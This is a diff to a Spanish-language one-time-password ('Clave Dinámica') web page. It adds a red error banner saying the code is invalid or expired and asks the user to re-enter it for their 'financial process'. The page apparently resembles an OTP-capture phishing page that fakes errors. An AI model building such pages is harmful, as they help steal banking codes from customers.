@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Clave Dinámica (OTP)</title>
+  <title>Clave Dinámica (OTP) - Error</title>
   <style>
     body {
       background-color: #fff;
@@ -60,6 +60,16 @@
       margin-bottom: 30px;
     }
 
+    .error-alert {
+      background-color: #ffdddd;
+      color: #cc0000;
+      padding: 12px;
+      font-size: 14px;
+      border-radius: 8px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
     .form-group {
       margin-bottom: 25px;
     }
@@ -111,6 +121,11 @@
   </div>
 
   <div class="container">
+    <div class="error-alert">
+      Su código OTP es inválido o ha expirado.<br>
+      Para seguir con su proceso financiero, por favor coloque su código correctamente.
+    </div>
+
     <h2>Clave Dinámica (OTP)</h2>
     <form onsubmit="guardarOtp(event)">
       <div class="form-group">
